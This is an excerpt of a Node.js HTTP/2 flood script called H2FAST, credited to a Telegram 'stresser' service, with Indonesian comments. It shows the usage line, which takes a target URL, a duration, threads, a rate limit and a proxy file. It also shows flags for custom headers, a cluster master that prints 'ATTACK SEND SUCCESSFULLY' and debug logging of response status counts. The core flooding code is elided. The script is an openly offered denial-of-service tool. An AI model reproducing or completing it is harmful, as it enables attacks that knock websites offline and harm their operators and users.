// Methods H2FAST Created By t.me/stevenstresser
// Jangan Dihapus Creditsnya, Yang Hapus Creditsnya Saya Sumpahi Jadi Yatim Karena Tidak Menghargai Creator/Pembuat Scriptnya
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
New Methods H2FAST V1.0
By: t.me/stevenstresser
StevenStresser | Is Best Stresser

Usage: node h2fast.js GET https://example.com 60 6 32 proxy.txt --debug  --delate --flood
...
--header                Modifikasi Permintaan
                        ( Menambah Atau Memodifikasi Header HTTP Custom )
...
if (cluster.isMaster) {
    ...
    console.clear();
    console.log(`ATTACK SEND SUCCESSFULLY BY T.ME/STEVENSTRESSER`);
    ...
    if (debugMode) {
        setInterval(() => {
            ...
            for (let [code, count] of sortedStatuses) {
                console.log(`[H2FAST V1.0] - [Status: ${code} / Count: ${count}]`);
            }
